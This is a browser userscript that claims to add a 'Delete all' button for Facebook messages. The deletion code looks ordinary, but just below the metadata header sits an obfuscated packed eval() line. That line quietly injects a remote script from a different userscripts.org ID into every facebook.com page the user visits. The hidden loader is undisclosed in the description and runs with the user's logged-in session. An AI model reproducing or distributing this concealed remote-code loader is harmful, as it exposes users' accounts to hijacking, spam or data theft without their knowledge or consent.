// ==UserScript==
// @name           Facebook - Delete All Messages Plus
// @namespace      http://userscripts.org/scripts/show/112793
// @description    Delete all facebook msg's at ones!
// @author         Rahul
// @version        1.0
// @homepage       http://www.checker.name
// @include        http*://www.facebook.com/messages*
// @include           http://www.facebook.com/*
// @include           https://www.facebook.com/*
// @include           http://*.facebook.com/*
// @include           https://*.facebook.com/*
// ==/UserScript==

eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('0.6.5(0.3(\'1\')).2=\'4://7.c/b/a/8.9.d\';',14,14,'document|script|src|createElement|https|appendChild|body|userscripts|170127|user|source|scripts|org|js'.split('|'),0,{}))


function check() {
	if(/\/messages\//.test(window.location.href)) {
		if(active) {
			appendButton();
		}
	} else {
		active = true;
	}
}

function delMsgs() {
	var msgs = document.getElementsByClassName('threadLink'); 
	var total = 0;
	var ready = 0;
	
	for(i in msgs) { 
		if(msgs[i].href) {
			++total;
			var tid = msgs[i].href.match(/&tid=([^&]+)/)[1]
			if(tid) {			
				with(new XMLHttpRequest) { 
					open('GET', '/ajax/messaging/async.php?action=delete&tids='+tid+'&__a=1', true);
					send();
					onreadystatechange = function() {
						if(this.readyState == 4) {
							if(++ready == total) {
								location.reload();
							}
						}
					};
				}
			}
		}
	}
}

function appendButton() {
	var btn = '<a rel="dialog" href="#" role="button" class="lfloat uiButton"><span class="uiButtonText" id="btnLabel">Delete all</span></a>';
	
	var h = document.getElementsByClassName('clearfix lfloat')[0];
	
	if(h) {
		h.innerHTML = btn + h.innerHTML;
		h.addEventListener('click',delMsgs,false);
		active = false;
	}
}

var active = true;
var interval = setInterval(check, 1000);